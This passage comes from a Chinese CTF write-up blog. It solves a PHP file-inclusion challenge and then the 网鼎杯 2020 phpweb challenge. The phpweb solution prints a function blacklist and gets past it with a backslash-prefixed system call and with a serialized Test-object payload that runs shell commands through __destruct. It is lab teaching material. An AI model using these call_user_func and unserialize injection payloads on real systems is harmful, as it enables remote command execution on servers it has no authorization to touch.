class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">byte2be</span><br>    <span class="hljs-attribute">byte2le</span><br>    <span class="hljs-attribute">byte4be</span><br>    <span class="hljs-attribute">byte4le</span><br>    <span class="hljs-attribute">BASE64</span><br>    <span class="hljs-attribute">HTML</span>-ENTITIES（别名：HTML）<br>    <span class="hljs-attribute">7bit</span><br>    <span class="hljs-attribute">8bit</span><br>    <span class="hljs-attribute">EUC</span>-CN*<br>    <span class="hljs-attribute">CP936</span><br>    <span class="hljs-attribute">GB18030</span><br>    <span class="hljs-attribute">HZ</span><br>    <span class="hljs-attribute">EUC</span>-TW*<br>    <span class="hljs-attribute">CP950</span><br>    <span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">EUC</span>-KR*<br>    <span class="hljs-attribute">UHC</span>（别名：CP949）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>（别名：CP1251）<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>（别名：CP1252）<br>    <span class="hljs-attribute">CP866</span>（别名：IBM866）<br>    <span class="hljs-attribute">KOI8</span>-R*<br>    <span class="hljs-attribute">KOI8</span>-U*<br>    <span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span>（别名：ArmSCII8<br></code></pre></td></tr></table></figure><br>直接去翻了wp。。感谢这位师傅：<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png" alt="image"><br>根据长度排列一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png" alt="image"><br>拿到flag：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png" alt="image"><br>最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png" alt="image"><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br><br>1xx（信息性状态码）：表示请求已被接收，继续处理。<br>   <span class="hljs-number"> 100 </span>Continue：服务器已接收到请求的初始部分，客户端应继续发送剩余部分。<br>   <span class="hljs-number"> 101 </span>Switching Protocols：服务器已理解并接受客户端的请求，将切换到新的协议。<br><br>2xx（成功状态码）：表示请求已成功被服务器接收、理解和处理。<br>   <span class="hljs-number"> 200 </span>OK：请求成功，服务器返回请求的内容。<br>   <span class="hljs-number"> 201 </span>Created：请求成功，服务器创建了新资源。<br>   <span class="hljs-number"> 204 </span>No Content：请求成功，服务器处理成功，但没有返回任何内容。<br><br>3xx（重定向状态码）：表示需要进一步操作以完成请求。<br>   <span class="hljs-number"> 301 </span>Moved Permanently：请求的资源已永久移动到新位置。<br>   <span class="hljs-number"> 302 </span>Found：请求的资源临时移动到新位置。<br>   <span class="hljs-number"> 304 </span>Not Modified：资源未修改，客户端可以使用缓存的版本。<br><br>4xx（客户端错误状态码）：表示客户端发送的请求有错误。<br>   <span class="hljs-number"> 400 </span>Bad Request：请求无效，服务器无法理解。<br>   <span class="hljs-number"> 401 </span>Unauthorized：请求要求身份验证。<br>   <span class="hljs-number"> 404 </span>Not Found：请求的资源不存在。<br><br>5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。<br>   <span class="hljs-number"> 500 </span>Internal Server Error：服务器遇到了意外错误。<br>   <span class="hljs-number"> 502 </span>Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效响应。<br>   <span class="hljs-number"> 503 </span>Service Unavailable：服务器当前无法处理请求，通常由于过载或维护。<br></code></pre></td></tr></table></figure><br><strong>[网鼎杯 2020 朱雀组]phpweb</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png" alt="image"><br>没啥特别的。。不过这页面没过几秒就会刷新一下，出现下面这种东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png" alt="image"><br>他说某个和data有关的函数设置有问题?右键看下源码有啥东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png" alt="image"><br>burpsuite抓下包看看：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png" alt="image"><br>下面有个这个东西：<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>前面是个函数？后面是他的参数？看着像命令执行，改成system(‘ls’)看看效果：<br><code>func=system&amp;p=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png" alt="image"><br>回显了hacker。。估计是太直白了，system&#x2F;eval都会回显Hacker。include&#x2F;require函数读下index.php的源码？<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png" alt="image"><br>提示call_user_func()函数找不到第一个参数include&#x2F;require或这是一个无效的函数名？怎么会找不到include()函数呢？问了下GPT发现call_back_func不是所有函数都能执行，它是<strong>调用一个回调函数或方法</strong>。而且并不是所有函数都是回调函数，判断一个函数能否回调可以用<code>is_callable</code>函数，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果：不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不得不说CHATGPT这东西确实好用，我问他call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)为什么不行时他不光给了不可用的理由，还建议我用file_get_contents()函数去读文件：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png" alt="image"><br>差点把这东西忘了，既然它可以回调就file_get_contents(index.php)读下Index.php：<br><code>func=file_get_contents&amp;p=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png" alt="image"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<span class="hljs-comment">//黑名单，禁用了很多函数</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>       <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>); <span class="hljs-comment">//调用call_user_func函数，注意该函数只能调用可以回调的函数</span><br>       <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>); <span class="hljs-comment">//$result是什么类型？</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123; <span class="hljs-comment">//如果是字符串</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125; <span class="hljs-comment">//如果是其它</span><br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="hljs-comment">//旧式的用于声明类属性（成员变量）的关键字，新版本的PHP多用 public等</span><br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<span class="hljs-comment">//获取通过 GET、POST 和 COOKIE 方法传递的参数</span><br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>       <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>尝试用相对路径读有没有flag.php这东西。。没试出来。。就去网上找了下wp。感觉已经很接近结果了有点不甘心😔感谢这位师傅的文章：<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>第一种方法：<br>在PHP中的函数前面加个\并不印象函数运行(php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单)。拿前面那个is_callable函数举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (\<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果仍是不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问了下GPT，这个\是一种命名空间限定符，用于告诉 PHP 解释器要使用全局命名空间中的函数，而不是当前命名空间中的函数。如果没有使用命名空间或没有同名函数存在于全局命名空间中，添加反斜杠将没有实际影响。<br><code>func=\system&amp;p=find / -name &quot;flag*&quot;//跟以前做的题一样，只要用find找东西就是全磁盘查找，会很慢</code><br>回显：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png" alt="image"><br>读最底下这个<code>/tmp/flagoefiu4r93</code>：<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>或者<code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code><br>得flag<br>第二种方法用了反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p); <span class="hljs-comment">//命令执行</span><br>            &#125;<br>        &#125;<br><span class="hljs-comment">//这东西没被用过，因为Test类里包含一个__destruct函数，这函数在对象被销毁时会被调用，</span><br></code></pre></td></tr></table></figure><p>我们想执行system(‘ls’)而且要绕过对func的黑名单检测，可以先序列化要执行的命令，然后利用get函数反序列化要执行的命令，反序列化后要销毁变量时会调用__destruct函数，这个函数定义了func(要执行的命令)和p(要执行命令的参数)，然后再调用一次gettime函数(又执行了一次命令)。一来一回执行了两次gettime。<br>先序列化我们要执行的命令和参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>       <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//结果：O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// 看当前目录下有什么文件</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png" alt="image"><br>OK，没啥问题，因为根据第一种做法已经知道了flag藏在哪，直接去找<code>/tmp/flagoefiu4r93</code>把我们的命令序列化一下：<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>结果：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
